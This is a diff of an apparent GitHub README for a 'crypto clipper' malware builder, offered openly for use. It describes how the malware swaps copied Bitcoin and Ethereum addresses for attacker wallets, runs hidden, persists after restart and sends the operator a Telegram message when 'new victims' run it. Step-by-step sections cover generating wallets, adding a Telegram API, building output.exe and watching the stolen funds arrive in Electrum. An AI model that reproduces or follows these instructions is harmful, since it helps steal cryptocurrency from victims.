@@ -2,24 +2,33 @@
 
 ## About
 
-A crypto clipper, also known as a crypto stealer, BTC clipper, Bitcoin clipper, Bitcoin stealer, or crypto hijacker, is a malicious software that poses a significant threat to cryptocurrency users. This type of malware operates by intercepting cryptocurrency transactions and tampering with the recipient's wallet address.
+Crypto Clipper, also known as a crypto stealer or BTC clipper, is a type of malicious software that poses a significant threat to cryptocurrency users. With the increasing popularity and value of cryptocurrencies like Bitcoin, cybercriminals have developed sophisticated techniques to exploit unsuspecting individuals and steal their digital assets.
 
-By leveraging advanced techniques, crypto clippers can detect when users copy and paste wallet addresses, allowing them to modify the clipboard contents. This manipulation replaces the intended recipient's wallet address with the attacker's address, redirecting the funds to the attacker's account instead.
+A crypto clipper specifically targets cryptocurrency transactions by manipulating the clipboard function on infected devices. When a user copies a cryptocurrency address to the clipboard, the malware intercepts the copied address and replaces it with the attacker's address. As a result, when the user pastes the address into a transaction, the funds are unknowingly redirected to the attacker's wallet instead of the intended recipient.
 
+This form of attack primarily focuses on Bitcoin, the most widely recognized and valuable cryptocurrency. By hijacking the clipboard, the crypto clipper can easily modify Bitcoin addresses, making it difficult for users to detect the fraudulent activity until it's too late. The stolen funds can be virtually untraceable, leaving victims at a significant financial loss.
+
+In addition to being referred to as a crypto stealer or BTC clipper, this type of malware is also commonly known as a Bitcoin clipper or Bitcoin stealer. These terms highlight the specific targeting of Bitcoin transactions and the malicious intent behind the software.
+
+It is crucial for cryptocurrency users to be aware of the risks associated with crypto clippers and take proactive measures to protect their digital assets. This includes using reputable antivirus software, regularly updating their devices and applications, and exercising caution when interacting with cryptocurrency addresses. By staying informed and implementing robust security practices, users can minimize the risk of falling victim to crypto hijackers and safeguard their valuable cryptocurrencies.
 
 ## Features
 
-Fastest CryptoClipper on the internet:
+### Fastest CryptoClipper on the internet:
 
-1) Mass generation of Bitcoin and Ethereum wallets.
-2) Builds a malware that replaces any Bitcoin or Ethereum address copied to the Windows clipboard with one of the generated addresses.
-3) The file is designed to run hidden 100% as a background process.
-4) The malware runs automatically after a system restart.
-5)  You can add the Telegram API to receive notifications whenever new victims execute malware.
+**1) MASS GENERATION OF BITCOIN AND ETHEREUM WALLETS.**
+
+**2) BUILDS A MALWARE THAT REPLACES ANY BITCOIN OR ETHEREUM ADDRESS COPIED TO THE WINDOWS CLIPBOARD WITH ONE OF THE GENERATED ADDRESSES.**
+
+**3) THE FILE IS DESIGNED TO RUN HIDDEN 100% AS A BACKGROUND PROCESS.**
+
+**4) THE MALWARE RUNS AUTOMATICALLY AFTER A SYSTEM RESTART.**
+
+**5)  YOU CAN ADD THE TELEGRAM API TO RECEIVE NOTIFICATIONS WHENEVER NEW VICTIMS EXECUTE MALWARE.**
 
 ## How to use
 
-1)  MASS GENERATE BITCOIN AND ETHEREUM WALLETS:
+### 1)  MASS GENERATE BITCOIN AND ETHEREUM WALLETS:
 
 To get started, generate your own Bitcoin and Ethereum addresses along with their private keys.
 
@@ -54,7 +63,7 @@ Note: If you don't want to use our wallet generator and prefer to use your own w
 
 
 
-2)ADD YOUR TELEGRAM API TO MALWARE (OPTIONAL)
+### 2)ADD YOUR TELEGRAM API TO MALWARE (OPTIONAL)
 
 To use Telegram API with the malware, you can add your Telegram API credentials to the config.txt file. This will enable the malware to send a message to your Telegram bot whenever a new user runs the program. However, adding the Telegram API is optional and not necessary for the malware to function.
 
@@ -107,7 +116,7 @@ Finally, open the TLS folder and then open config.txt. Add your URL after the wa
 Then build the malware. As soon as a new user runs the malware, it will send you a message saying, "User <user's unique ID> ran the malware."
 
 
-3)BUILD THE CRYPTO CLIPPER STANDALONE EXECUTABLE FILE
+### 3)BUILD THE CRYPTO CLIPPER STANDALONE EXECUTABLE FILE
 
 - Your generated Bitcoin and Ethereum addresses will be hard-coded into a new executable file called output.exe.
 
@@ -122,31 +131,31 @@ Then build the malware. As soon as a new user runs the malware, it will send you
 
 
 
-4)MONITOR YOUR WALLETS
+### 4)MONITOR YOUR WALLETS
 
 To check the balance of your Bitcoin addresses, I highly recommend using Electrum wallet. However, you are free to use any wallet of your choice. If you have a cryptocurrency wallet that supports multiple addresses, you can import all of your addresses and check their balances in one place. For example, the Exodus wallet supports both Bitcoin and Ethereum, and allows you to import multiple addresses.
 
 To use Electrum:
 
-1_ Download Electrum from their website: https://electrum.org/#download
+#### 1_ Download Electrum from their website: https://electrum.org/#download
 
-2_ Install and open the program
+#### 2_ Install and open the program
 
-3_ Create a new wallet
+#### 3_ Create a new wallet
 
-4_ Select Import Bitcoin addresses or private keys
+#### 4_ Select Import Bitcoin addresses or private keys
 
 ![img5](https://github.com/btc-stealer/crypto-clipper/assets/150532647/1d2125d4-7e14-4826-93ac-2a9ad449b8dc)
 
-5_ Import all of your Bitcoin addresses into the field:
+#### 5_ Import all of your Bitcoin addresses into the field:
 
 
 ![Img6](https://github.com/btc-stealer/crypto-clipper/assets/150532647/eb08da1d-90b4-4805-8609-22ccfc5f6278)
 
 
-6_ Add a password for your wallet or leave it blank and click “Next.”
+##### 6_ Add a password for your wallet or leave it blank and click “Next.”
 
-7_ There you go! You have created a watchlist that will check the balance of all the addresses frequently. Once one of your Bitcoin addresses receives a deposit, you can import the private key of that particular address.
+##### 7_ There you go! You have created a watchlist that will check the balance of all the addresses frequently. Once one of your Bitcoin addresses receives a deposit, you can import the private key of that particular address.
 
 ![img7](https://github.com/btc-stealer/crypto-clipper/assets/150532647/791c958a-b749-43d9-9573-dfb2e9c14778)
 
